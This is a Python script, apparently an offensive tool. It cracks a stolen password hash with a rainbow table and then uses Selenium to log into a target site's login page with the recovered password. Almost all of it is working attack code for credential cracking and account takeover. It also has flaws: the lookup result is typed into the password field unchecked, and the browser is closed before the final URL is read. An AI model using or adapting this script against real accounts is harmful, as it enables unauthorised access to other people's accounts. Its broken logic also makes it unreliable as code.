import rainbowtables as rt
import time
from selenium import webdriver
from selenium.webdriver.common.by import By


def create_table(wordlists, path="/rainbow_tables", file_name="rainbow_table", hash_type="sha256"):
    rt.set_directory(path, full_path=False)
    rt.set_filename(file_name)

    rt.create_directory()
    rt.create_file()
    rt.insert_wordlists(wordlists, hash_type, wordlist_encoding="utf-8", display_progress=True, compression=True)


# hashed is the hashed value of the real password
def hash_lookup(hashed, table="rainbow_table"):
    lookup = rt.search(hashed, table, full_path=True, time_took=True, compression=True)
    # false if search failed
    # else tuple plaintext and time took to find
    # plaintext is a password that gives the same hashed value like the original function
    return lookup


def execute(login_url, user_name, hashed, table="rainbow_table"):
    # table creation should happen prior to execution ??

    # extract relevant username and hashed password from db or from GUI

    # lookup the hash in the table
    fake_password = hash_lookup(hashed, table)

    # lookup successful -> go through login flow
    # open up login page
    driver_url = login_url

    driver = webdriver.Chrome()
    driver.get(driver_url)

    time.sleep(1)  # wait for the page to load

    # Find and fill the fields with desired values
    input_elements = driver.find_elements(By.TAG_NAME, "input")
    input_elements = [element for element in input_elements if element.is_displayed()]

    for i in range(2):
        name = input_elements[i].get_attribute("name")
        # print("name: " + name)
        script = f"document.getElementsByName('{name}')[0].type = 'text';"
        driver.execute_script(script)

    # input username and plaintext
    input_elements[0].send_keys(user_name)  # Enter the username
    input_elements[1].send_keys(fake_password)  # Enter password

    # Find and click the submit button
    button_elements = driver.find_elements(By.TAG_NAME, "button")
    button_elements = [element for element in button_elements if element.is_displayed() and
                       (element.get_attribute("type") == "submit" or
                        element.get_attribute("disabled type") == "submit")]
    if len(button_elements) == 0:
        button_elements = input_elements
        button_elements = [element for element in button_elements if element.is_displayed() and
                           (element.get_attribute("type") == "submit" or
                            element.get_attribute("disabled type") == "submit")]

    # perform login
    button_elements[-1].click()

    time.sleep(1)  # wait for the page to load

    driver.quit()

    # lookup failed -> abort
    new_url = driver.current_url
    passed = driver_url != new_url

    # Close the browser window
    driver.quit()
    return passed